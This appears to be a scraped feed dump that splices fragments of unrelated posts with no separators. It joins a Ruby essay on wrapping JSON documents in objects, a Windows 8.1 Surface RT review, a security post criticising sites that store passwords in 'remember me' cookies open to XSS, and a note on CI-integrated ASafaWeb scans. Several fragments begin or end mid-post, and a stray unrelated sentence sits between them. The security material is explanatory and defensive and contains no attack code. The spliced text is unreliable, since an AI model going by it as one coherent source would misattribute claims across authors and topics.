JSON documents can be persisted directly,either by using an<a href=\"http://martinfowler.com/bliki/AggregateOrientedDatabase.html\">AggregateOrientedDatabase</a>or a<a href=\"/eaaCatalog/serializedLOB.html\">serialized LOB</a>ina relational database. JSON documents can also be served directlyto web browsers or used to transfer data to server-side pagerenderers. When JSON is being used in this way, I hear people sayingthat using an object-oriented language gets in the way because theJSON needs to be translated into objects only to be rendered outagain - a waste of programming effort<a href=\"#footnote-effort\">[1]</a>. I agreewith the point about waste, but I argue that it's not a problem with objects buta failure to understand encapsulation.</p><p>Let's imagine we're storing an order as a JSON document andserving it up with minor server-side processing, again as JSON. Anexample document might be like this.</p><pre>{ \"id\": 1234,\"customer\": \"martin\",\"items\": [{\"product\": \"talisker\", \"quantity\": 500},{\"product\": \"macallan\", \"quantity\": 800},{\"product\": \"ledaig\",   \"quantity\": 1100}],\"deliveries\": [{ \"id\": 7722,\"shipDate\": \"2013-04-19\",\"items\": [{\"product\": \"talisker\", \"quantity\": 300},{\"product\": \"ledaig\",   \"quantity\": 500}]},{ \"id\": 6533,\"shipDate\": \"2013-04-18\",\"items\": [{\"product\": \"talisker\", \"quantity\": 200},{\"product\": \"ledaig\",   \"quantity\": 300},{\"product\": \"macallan\", \"quantity\": 300}]}]}</pre><p>We'll assume we haven't got much server-side processing to do, but we do havesome. Let's also assume we're using an OO language. A naive approachmight be to read in the JSON document, convert the data to theappropriate object graph (with orders, line-items, and deliveries),apply any processing, and then serialize the object graph to JSONfor the client.</p><p>In many of these situtiations a better way to proceed is to keepthe data in a JSONish form, but still wrap it with objects tocoordinate manipulation. Most programming environments providegeneric libraries that take a document and deserialize it to genericdata structures. So a JSON document would deserialize to a structureof lists and dictionaries, an xml document to a tree of xml nodes.We can then take this generic data structure and put it into a fieldof an order object - here's an example with Ruby and JSON.</p><pre>class Order...def initialize jsonDocument@data = JSON.parse(jsonDocument)end</pre><p>When we want to manipulate the data, we can define methods on theobject as usual, and implement them by accessing this data structre.</p><pre>class Order...def customer@data['customer']enddef quantity_for aProductitem = @data['items'].detect{|i| aProduct == i['product']}return item ? item['quantity'] : 0end</pre><p>This includes cases with more complex logic.<a href=\"#footnote-collection-lambda\">[2]</a></p><pre>class Order...def outstanding_delivery_for aProductdelivered_amount = @data['deliveries'].map{|d| d['items']}.flatten.select{|d| aProduct == d['product']}.inject(0){|res, d| res += d['quantity']}return quantity_for(aProduct) - delivered_amountend</pre><p>The embedded document can be enriched before sending to the client.</p><pre>class Order...def enrich@data['earliestShipDate'] =@data['deliveries'].map{|d| Date.parse(d['shipDate'])}.min.to_send</pre><p>If needed, you can form similar objects on sub-trees of theembedded document.</p><pre>class Order...def deliveries@data['deliveries'].map{|d| Delivery.new(d)}end</pre><pre>class Delivery...def initialize hash@data = hashenddef ship_dateDate.parse(@data['shipDate'])end</pre><p>One thing be wary of here is that such object wrappers aren'tquite the same as normal objects. The delivery objects returned inthe above code fragment don't have the same equality semantics thatyou'd expect from objects arranged in the more usual structure.</p><p>Despite its compartive rareity, an embedded document fits wellwith object-orientation. The point of encapsulated data is thehiding of the data structure, so that users of the object don't know or care aboutthe internal structure of the order.</p><p>Those familiar with functional programming will recognize thestyle of flowing a generic data structure through a series offunctions - you can think of the object as providing a namespace formanipulating the generic data stuctures.</p><p>The sweet spot for an embedded document is when you're providingthe document in the same form that you get it from the data store,but still want to do some manipulation of that data. If you don'thave any need to access the contents of the JSON document, thenthere's no need to even deserialize it into a generic datastructure. The order object needs only a constructor and a method toreturn its JSON representaiton. On the other hand as you do morework on the data - more server side logic, transforming intodifferent representations - then it's worth considering whether it'seasier to turn the data into an object graph.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-effort\"><p><span class=\"num\">1:</span>Some might argue it's a waste of computing effort too - althoughI would be surprised if it were significant.

But that's not as interesting to me as the ability to use your Desktop wallpaper as your Start Menu background. This might be hard to visualize, but the point is that if you hit the Start Button (or the Windows Key) you'll immediately move to the big Start Menu. When the background of that menu is your same desktop wallpaper, the result is much less jarring than a bright background and makes the whole Windows 8.x experience much more comforting.</p><p><img title=\"Windows 8.1\"style=\"display: inline\"alt=\"Windows 8.1\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(1)_3.png\"width=\"720\"height=\"405\"></p><p><img title=\"Using the Desktop Wallpaper as my Start Screen background\"style=\"display: inline\"alt=\"Using the Desktop Wallpaper as my Start Screen background\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(2)_3.png\"width=\"720\"height=\"405\"></p><p>From the Start Menu, hit Windows-C, click Settings, then Personalization. You'll see the menu fly out as in the picture below. Select the tiny thumbnail of your wallpaper. It's the square with the birds in my picture here.</p><p><img title=\"Screenshot (5)\"style=\"display: inline\"alt=\"Screenshot (5)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(5)_9.png\"width=\"720\"height=\"405\"></p><p>This little change is a huge difference. I wish this was the default experience, myself.</p><h3>Search Everywhere</h3><p>If you are in the Start Screen and you start typing it will search everything. Apps, Files and the Internet if you want. If you search for a Well Known Thing (caps mine) then it will give you detailed results that include (possibly) music, big pics, videos, etc. I searched for Daft Punk below.</p><p><img title=\"Screenshot (3)\"style=\"display: inline\"alt=\"Screenshot (3)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(3)_3.png\"width=\"720\"height=\"405\"></p><h3>Freaking Outlook 2013</h3><p>Since my Surface RT includes Office RT (Word, Excel, PointPoint, etc) it looks like Windows 8.1 adds Outlook 2013 RT to the mix! This was a total surprise to me, and is the #1 reason I'll start using my Surface for work stuff. I'm surprised this hasn't been noticed by some of the tech sites I read. It's an awesome addition.</p><p><img title=\"Outlook 2013 RT\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Outlook 2013 RT\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(4)_3.png\"width=\"722\"height=\"407\"></p><h3>Smarter Windowing</h3><p>Windows 8.1 seems much smarter about making decisions about window management. Here I've launched the Games app while running the Mail app on the left and the Desktop on the right. it's hovering (teetering, even) in the middle, waiting to be pulled from one side to the other, rather than just taking over one of my existing apps.</p><p>Apps can be 50/50 split on the Surface RT, as well as the other 70/30 options.</p><p><img title=\"Screenshot (6)\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Screenshot (6)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(6)_3.png\"width=\"722\"height=\"407\"></p><h3>Way easier customization</h3><p>Icons are moved more like on my other tablets, with a push and hold gesture. Except you can select multiple icons, start dragging them with one figure while<em>scrolling with the other finger</em>. Grouping and customizing is way easier.</p><p>Here is me starting to move things around.

You swipe down from the Start Menu to get here, and can sort by Recently Installed as well. I found a bunch of new apps I hadn't seen before like Calculator, Sound Recorder, Health and Fitness and Alarms.</p><p><img title=\"All Apps View\"style=\"display: inline\"alt=\"All Apps View\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(9)_3.png\"width=\"720\"height=\"405\"></p><h3>More Comprehensive Settings</h3><p>The Settings area has a LOT more info than before, including some rather deep pages (you may have to hunt) like this one on my Wi-Fi Router. Note that it's marked as a Meter Connection. I thought it was cool that Outlook didn't connect automatically when this was marked as Metered (this means my router has limited data and I could be charged for big downloads). I have personally downloaded gigs of mail while overseas and gotten nailed by big bills, so this was cool.</p><p>The Metering is an existing feature, but the deeper details into my Wi-Fi and devices is new.</p><p><img title=\"Better Wi-Fi\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Better Wi-Fi\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(10)_3.png\"width=\"722\"height=\"407\"></p><h3>Removable Disks in your Music and Video Libraries</h3><p>I'm pretty sure this wasn't there before. I added a 64gig micro-SD to my Surface RT with the plan to watch Videos and store Photos on it, but it wasn't very seamless in Windows 8. I took a chance and right clicked on my SD card folders and said\"Include in Library\"and now my videos show up in the Videos app! Suddenly my 32-gig Surface has become a more useful 96 gig machine (well, 64-gig, as I'm going to change the defaults to store everything on my SD card.)</p><p><img title=\"Removeable disks in libraries\"style=\"display: inline\"alt=\"Removeable disks in libraries\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(11)_3.png\"width=\"720\"height=\"405\"></p><p>Here's my videos listed, some in the cloud and some on my micro SD card.</p><p><img title=\"My videos from the SD Card\"style=\"display: inline\"alt=\"My videos from the SD Card\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(12)_3.png\"width=\"720\"height=\"405\"></p><p>Here I am looking at Outlook while watching Harry Potter in Split-Screen.</p><p><img title=\"Outlook plus Harry Potter\"style=\"display: inline\"alt=\"Outlook plus Harry Potter\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(14)_3.png\"width=\"720\"height=\"405\"></p><h3>Smarter Notifications and Quiet Hours</h3><p>My wife is NOT a fan of my Surface RT for one basic reason. It won't stop beeping. I installed Twitter and Twitter\"pops toast\"- meaning, it uses notifications - and it's forever going off and beeping at night. Yes, I could turn off notifications, or sleep it, and I do, but when I'm using the thing I want it on. The Notifications options have been expanded to include\"quiet hours,\"which is a nice touch.</p><p><img title=\"Quiet Hours\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Quiet Hours\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(18)_3.png\"width=\"722\"height=\"407\"></p><h3>The Reading List</h3><p>I'm a big fan of Instapaper and the idea of a\"Read It Later\"gesture.

Their marketing folks were just pulling the photos from a shared folder, treating them as stock images.

Let’s start with the<em>really</em>wrong stuff and work from there.</p><a name='more'></a><h4>Anti-patterns</h4><p>This seems obvious, right? I mean the implementation of a “remember me” feature is pretty fundamental, not the sort of thing easily gotten wrong, surely? Apparently not.</p><p>Let me share two anti-patterns and we’ll discuss the problems with them before talking about how to do it right. The first example comes courtesy of Black& Decker, that would be the same B&D I recently wrote about in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy</a>. Here’s the idea when you login:</p><p><img width=\"488\" height=\"285\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Black& Decker\" src=\"http://lh5.ggpht.com/-wvgqafGAVEU/UdFF-1kwgAI/AAAAAAAAFb0/r7vYPJJfcM8/image5.png?imgmax=800\" border=\"0\"></p><p>That’s all pretty standard, the interesting bit comes after you log in. Let’s take a look at the cookies:</p><p><img width=\"798\" height=\"332\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Black& Decker cookies\" src=\"http://lh5.ggpht.com/-eP31JfR5TiQ/UdFF_gwV6qI/AAAAAAAAFb8/pcnOHLUp0IM/image2.png?imgmax=800\" border=\"0\"></p><p>This is a fairly impressive set of cookies but it’s the highlighted ones that are genuinely interesting. These cookies won’t get set if you don’t check the “remember me” box so their function is purely to log you back in later on. My email address is pretty clearly in there, but that’s not my password, instead it appears to be some sort of impenetrable fortress of cryptographic… hang on – that’s Base64 encoding! The thing about Base64 encoding is that it’s neatly complemented by Base64<em>de</em>coding which means that you can head off to somewhere like<a href=\"http://www.base64decode.org\">base64decode.org</a>and do this:</p><p><img width=\"514\" height=\"313\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Base 64 decoding the Black& Decker cookie\" src=\"http://lh3.ggpht.com/-aQZzH2NHr6c/UdFGASLoJQI/AAAAAAAAFcE/bxNThlU8CnQ/image8.png?imgmax=800\" border=\"0\"></p><p>Now not everyone uses Base64 as a means of “cryptography” (yes,<a href=\"http://www.troyhunt.com/2013/01/the-problem-with-website-security-is-us.html\">some people do genuinely do this</a>) and indeed it’s a perfectly legitimate means of representing data in an ASCII format, the real story here however is that this is my password sitting there in my browser in plain text. You may wonder – why is this a problem? It’s in your own browser, right? How does an attacker get it?</p><p>I’m going to talk about two very easy ways and the first relates to the earlier link about insecurity being easy. Black& Decker had exposed ELMAH logs and in those logs was every unhandled internal server exception, somewhere north of 50,000 of them at the time I reported it to them. When ELMAH logs an exception it also logs all the request headers which means the<em>cookies</em>are logged. Combine that with the huge number of unhandled exceptions being thrown by the system and now you have a treasure trove of user credentials. Yes, they should have secured their ELMAH log properly to begin with but it’s a good example of how you can be very easily undone by one very simple misconfiguration.</p><p>Here’s another one:</p><p><img width=\"250\" height=\"378\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Aussie Farmers Direct\" src=\"http://lh3.ggpht.com/-0MQkqGmrVW8/UdFGBK_Z0QI/AAAAAAAAFcM/7HqbqOyYEEM/image311.png?imgmax=800\" border=\"0\"></p><p>This is<a href=\"https://orders.aussiefarmers.com.au\">Aussie Farmers Direct</a>and it’s a fairly typical looking log in form. Let’s log in, tell it to “remember me” then take a look at the cookies:</p><p><img width=\"796\" height=\"139\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Aussie Farmers Direct cookies\" src=\"http://lh5.ggpht.com/-5OyfmaliDfc/UdFGB70cl0I/AAAAAAAAFcU/kFUtgoBKXrk/image91.png?imgmax=800\" border=\"0\"></p><p>Oh dear, same deal again but without any Base64 encoding. Actually this one is particularly bad because you can do stuff like this:</p><p><img width=\"476\" height=\"37\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Improperly encoded cookie on Aussie Farmers Direct\" src=\"http://lh5.ggpht.com/-HMSOuv66vcg/UdFGCsHlkYI/AAAAAAAAFcc/0emkrm4pDqQ/image18.png?imgmax=800\" border=\"0\"></p><p>XSS your own JSON cookie? Sure! The other idiosyncrasy is that changing your password doesn’t change the cookie so you come back to the site later on and it tries to log you in with the old one. Oops.</p><p>Aussie Farmers Direct doesn’t have exposed ELMAH logs (being PHP kind of helps with that!) but they do have other risks such as XSS (incidentally, this has been responsibly disclosed and the risk summarily dismissed – multiple times). The other thing about both the sites above is that those cookies holding the passwords aren’t flagged as HttpOnly, you can see this in the second column from the right in the cookie lists. What this means is that client script can access those cookies which means that if you can get a piece of XSS onto the site – just as you can on the Aussie Farmers site – you can steal cookies containing passwords if you can get a customer to load the XSS payload (and there are numerous ways of doing that). The missing HttpOnly attribute is sloppy on behalf of both sites, but the core of the issue is storing passwords in cookies which then makes them vulnerable via other oversights.</p><p>There’s one more fundamentally important reason why both these practices are negligent; they’re protecting customers’ credentials used on other sites. Every time a customer using the “remember me” feature on one of the sites above makes a request, there’s a very good chance they’re sending the username and password to their email, their eBay or their bank across the wire, sometimes in plain text, sometimes accessible via client script, always sitting there unprotected in the browser.<a href=\"http://www.troyhunt.com/2012/07/what-do-sony-and-yahoo-have-in-common.html\">Password reuse is rampant</a>and whilst those damn users should take some bloody responsibility (I’m paraphrasing here!), we – as developers –<em>must</em>acknowledge that we’re protecting far more than just our own site when we handle credentials.</p><p>So that should establish that there is a genuine misunderstanding of how the “remember me” feature<em>should</em>be built, let’s now move onto the good practices.</p><h4>A sample reference implementation</h4><p>One of the mantras you frequently hear in the security world is “Don’t roll your own – use what’s already been proven to be robust”. This is very frequently applied to encryption and authentication schemes but in this case we can extend this to the “remember me” feature in order to start with a good reference implementation before we delve into the details.</p><p>In a new ASP.NET MVC 4 website provisioned with Visual Studio 2012 you get this right out of the box:</p><p><img width=\"352\" height=\"338\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to a sample ASP.NET application\" src=\"http://lh3.ggpht.com/-T6wJXCWtnpQ/UdFGDJgd8iI/AAAAAAAAFck/vaA2S0PkYic/image31%25255B1%25255D.png?imgmax=800\" border=\"0\"></p><p>Other frameworks have other standard modes of implementing this feature but this is an easy one for me to refer to. When we login with the fields as above (i.e. not asking it to remember me), successful authentication results in the following cookie being returned:</p><pre>Set-Cookie:.ASPXAUTH=6891A5EAF17A9C35B51C4ED3C473FBA294187C97B758880F9A56E3D335E2F020B86A85E1D0074BDAB2E1C9DBE590AF67895C0F989BA137E292035A3093A702DEC9D0D8089E1D007089F75A77D1B2A79CAA800E8F62D3D807CBB86779DB52F012; path=/; HttpOnly</pre><p>This is simply an auth cookie and in the stateless world that is HTTP it’s the one little piece of data that ties all the otherwise entirely independent requests from one person together. Each time this unique-to-me cookie is sent, the website knows it’s me and that I’ve already authenticated. We can see it bit more clearly when we look at it in Chrome’s Cookies collection:</p><p><img width=\"794\" height=\"56\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application without the\"remember me\" box checked\" src=\"http://lh3.ggpht.com/-8rKwUf_wQtk/UdFGDifnEmI/AAAAAAAAFcs/HrHn4wNix-s/image6.png?imgmax=800\" border=\"0\"></p><p>Incidentally, the second cookie is an anti-forgery token to prevent CSRF attacks and has nothing to do with our authenticated state. Other than that, there are no other cookies.</p><p>Let’s now log in and ask the site to remember me, here’s the cookie response:</p><pre>Set-Cookie:.ASPXAUTH=3A92DAC7EFF4EE5B2027A13DD8ABEA8254F0A16D8059FCAF60F5533F1B7D99462DDF57320D069A493481978750526DF952D5C9EA0371C84F5CF1BFC0CCA024C2052824D4BA09670A42B85AEC7FFCB4088FC744C6C0A22749F07AF6E65E674A4A; expires=Tue, 02-Jul-2013 00:27:05 GMT; path=/; HttpOnly</pre><p>Aha – you see that?! It becomes clearer when you see it broken down in Chrome:</p><p><img width=\"794\" height=\"55\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application with the\"remember me\" box checked\" src=\"http://lh5.ggpht.com/-BunTDUP-fbA/UdFGELSz1cI/AAAAAAAAFc0/NobvT62lNJA/image9.png?imgmax=800\" border=\"0\"></p><p>We now have a cookie expiration which is 48 hours from now as opposed to having no cookie expiration which means it will be discarded when the browser is closed. Let’s take a closer look at that.</p><h4>Looking at auth cookie expiration</h4><p>This is actually a ridiculously easy security construct and it’s only in light of the earlier examples that I’d even think it worth writing about, but here we are. In this implementation, the “remember me” feature simply boils down to when the auth cookie expires because what you’re really doing here is controlling how long you want someone to stay logged on for, it’s that simple.</p><p>In the example above, ASP.NET defaults to using a session cookie or in other words, a cookie that does not have an explicit expiration date and will therefore forcibly expire when the browser is closed. That’s one approach, another is to explicitly set a short expiration period so that even if the browser is left open the user will be automatically logged out after a period of time. Of course you can also control this behaviour on the server and you can also keep extending the lifetime of an auth cookie if the system is being actively used by the server increasing the expiration date on response.</p><p>Remembering someone can be as simple as keeping that auth cookie alive. How long should it be kept alive for? The example above defaults to two days which is probably a bit short for many legitimate uses of the feature (although it’s easily configurable in ASP.NET), try Facebook though and you’ll get cookies that last for a year. Shorter duration means less risk but more inconvenience, longer duration makes it easier for the user but increases the window of potential attack. Let’s take a look at that risk in more detail.</p><h4>Exploiting long-running authentication state</h4><p>While you are not authenticated, your session can’t be hijacked. I know, insightful stuff! But seriously, take a case like Aussie Farmers Direct above; that cookie will expire in six months and combined with the fact that it’s not flagged as HTTP only and that they have XSS flaws in the site there’s now half a year window where just following a link could cause me to inadvertently hand over my credentials to an attacker. If that period was, say, one month yes, they’d still have some serious flaws in their design but then the window of opportunity for an attacker has just been slashed.</p><p>On the other hand, Black& Decker has a relative short one week expiration period so in their case with the exposed ELMAH logs, yes, there was a series of bad failures on their part but unless someone had logged in with the “remember me” box ticked in the last week<em>and</em>caused an unhandled exception, the credentials wouldn’t be put on public display. Ok, if you’re on the site to begin with there’s a good chance you’re already logged in (at least compared to the Farmers example where you wouldn’t have to consciously go anywhere near the site to lose your password) but you can see how that risk profile changes with the cookie expiration period.</p><p>Of course underlying all this is that the auth cookie needs to be carefully protected; HttpOnly and secure attributes are an absolute must. All your classic hijacking threats remain relevant but then again, however you slice and dice this feature you’re going to end up with a cookie dependency therefore you’re going to need to watch those cookies very, very carefully.</p><p>Ultimately it’s a trade-off that needs to consider factors such as the value to an attacker of the user’s data on the site, the barrier that<em>not</em>being authenticated poses to a returning user and the security profile of the rest of the site. For example, Facebook has some very useful data of a social nature and users expect a low-friction (even<em>no</em>-friction) process when returning, plus they’ve made<em>massive</em>investments in their security profile. Aussie Farmer’s, on the other hand, holds personally identifiable user data plus financial info whilst providing a service that people<em>expect</em>to authenticate to (payment facilities) yet have little understanding of important security concepts. They’re very different risk profiles and they<em>should</em>be very different auth cookie expiration strategies.</p><h4>Strengthening the approach</h4><p>There will be folks who look at the auth cookie approach and roll their eyes in despair. The thing about security is that there’s always a better way depending on the time / money / complexity you’re willing to add and there’s also always someone ready to tell you you’ve got it wrong! Using the auth cookie expiration as a starting point, let’s look at some possible ways of strengthening the approach.</p><p>One argument against long expiration of auth cookies is that they’re effectively keeping the user authenticated and at risk of attacks such as CSRF or clickjacking. Of course the application needs to exhibit other risks in order for an attacker to capitalise on the long lasting cookie but the whole defence in depth argument comes up again. An alternative is to have a dedicated cookie keyed against the user which after validating the authenticity of it with the server, can then initiate a new authenticated session on their return. The original session can then expire quickly, the trick is to re-instate a new one when the user comes back with the dedicated “remember me” cookie and include some additional validation in the process.</p><p>One way of providing additional validation is by including the user’s IP address / user agent / other distinguishing feature in the “remember me” cookie. The rationale is that this offers some defence against hijacking of the cookie. The problem, of course, is that there are legitimate use cases where these change. In the mobile world in particular it’s not uncommon to return to a site with a different IP. Even in the world of physical connections you can’t necessarily rely on the ISP providing a static IP address. As for user agents, with browsers like Chrome and Firefox updating at what seems like every other day, unless you’re a bit selective about<em>what</em>attributes of the user agent string you’re storing and comparing that’s going to be a risky approach. The same defences around using unique user attributes to and add security are often discussed in the context of session and auth cookies and whilst I’m sure there are valid use cases for this (back to banking again), I can’t say I’ve actually seen it in place in any of the sites I’ve tested before. There’s probably a good reason for that…</p><p>A more pragmatic mitigation is to still separate the auth cookie from a dedicated “remember me” cookie and use the latter to re-authenticate the user<em>but impose some restrictions</em>. The reality is that the process of automatically persisting someone’s authenticated state – through whatever means – introduces compromises to the security model. A mitigation would be to require an automatically re-authenticated user to expressly provide their credentials again before viewing certain classes of data or performing certain activities. This is not unheard of even outside the scope of “remember me”, you might see it when performing high-value activities such as a bank transfer. In this case, we’re saying that the authenticated user is at greater risk because there’s more likelihood that they’re not who they say they are (i.e. someone else has sat down at the PC and effectively highjacked a session).</p><p>The other hardening we can apply to this approach is to ensure that the cookie used to remember the user is reset after it has been used. This also means invalidating it on the server side so there needs to be both uniqueness and persistence of the cookie value, for example a nonce persisted in both the database and the cookie. This has the benefit of ensuring that if the cookie<em>is</em>obtained by an attacker it has only has a single use scope – and that’s if the user can’t legitimately use it before them. There’s a good little article<a href=\"http://jaspan.com/improved_persistent_login_cookie_best_practice\">here</a>which talks about some mitigations to this pattern and again, there are use cases where this can be beneficial but you are going to invest additional effort building it and there are cases where it will inconvenience legitimate users (i.e. trying to remember yourself on the same site across multiple PCs).</p><p>The last thing worth mentioning is that the same account management principles that need to be considered for active authenticated sessions are relevant in the “remember me” context. For example, are multiple simultaneously authenticated sessions allowed from the one user? If the user changes their password will it disconnect the other sessions? Can an administrator end the authenticated session? There are all sorts of issues that come up that are<em>really</em>part of the discussion on how authenticated sessions are verified and managed, the discussion here is merely about how to reinstate that.</p><h4>When shouldn’t you allow “remember me”? (and some middle-ground alternatives)</h4><p>Sometimes it simply<em>never</em>makes sense to allow an authenticated user to remain authenticated for long periods of time. Banking, for example, is the stereotypical use case for when you want to force re-authentication as soon as possible as the risks are just too significant to leave unused authenticated browser sessions lying around the place.</p><p>But there is actually some middle ground that can be taken here:</p><p><img width=\"240\" height=\"278\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A\"remember me\" box on the American Express website\" src=\"http://lh4.ggpht.com/-utZn1CP4eZM/UdFGEmoMc9I/AAAAAAAAFc8/Lh20wkoe09Y/image12.png?imgmax=800\" border=\"0\"></p><p>This is not entirely what it looks like – when you come back after an expired session where you asked the site to “Remember Me”, you’ll get this:</p><p><img width=\"241\" height=\"280\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The American Express website pre-populating the username on return\" src=\"http://lh6.ggpht.com/-4s1S1UF2cYQ/UdFGFMBkHXI/AAAAAAAAFdE/4NdTjBkR_rM/image15.png?imgmax=800\" border=\"0\"></p><p>I’ve not obfuscated the username, the username as it appears above with the stars are stored in a cookie that lasts for three months along with some other data that inevitably identifies the user. Frankly, I don’t see a lot of value in this, remembering your username isn’t usually the problem!</p><p>But it also doesn’t have to be all or nothing, there’s middle ground. For example, the point I made earlier about re-authenticating before key processes are performed if the session had been resumed by a “remember me” feature. It’s a bit of the best of both worlds.</p><h4>In conclusion…</h4><p>This is one of those features that seems like a good idea at the time (and<em>sometimes</em>it is) and it’s usually very easy to get right, at least<em>sufficiently</em>right for most purposes. Frankly, it’s still a little baffling how wrong the two earlier examples got it particularly when you consider that it would have been sufficient to just extend the lifetime of the cookie they already have!</p><p>The other point to take away from this post beyond just the mechanics of the “remember me” feature is how security is such a multi-tiered, inter-dependent beast. You might be able to get away with credentials in cookies by themselves, but combine that with the ELMAH situation or missing HTTP only attributes and XSS flaws and suddenly a foolish albeit relatively innocuous practice becomes a serious risk.

Now each time the scan runs there’ll be a little ASafaWeb tab and a nice report on how the scan went:</p><p><img width=\"880\" height=\"522\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The ASafaWeb report in OnCheckin\" src=\"http://lh3.ggpht.com/-xlPwH-zRX9Q/UcIqLwBN_AI/AAAAAAAAFbU/EtXZ9ZXtZWk/image11.png?imgmax=800\" border=\"0\"></p><p>What I really like about this is the continuous nature of the process. Every time that build runs, the site is going to get scanned and so long as you’re keeping an eye on the results you shouldn’t have sneaky security misconfigurations making their way through to production. Well at least not for very long!</p><p>The other thing about this integration is that it’s another step towards publicly releasing the ASafaWeb API. Yes, there’s an API and in fact it’s been used extensively as the magic behind the<a href=\"http://www.troyhunt.com/2012/08/welcome-to-asafaweb-scheduler.html\">ASafaWeb Scheduler</a>which gives you the ability to scan your sites on a regular basis (I mentioned it’s free, right?!). The intention has always been to open the API up for anyone to consume I reckon including it into the continuous integration cycle is a fantastic use-case.</p><p>To that effect, if you’re involved in a similar project and would like to integrate ASafaWeb then I’d love to hear from you. I’m happy to open it up to beta testers who want to contribute feedback and I know there are a<em>ton</em>of good ideas out there for how it might be used.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/0sjQHMWcphI\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1220}}

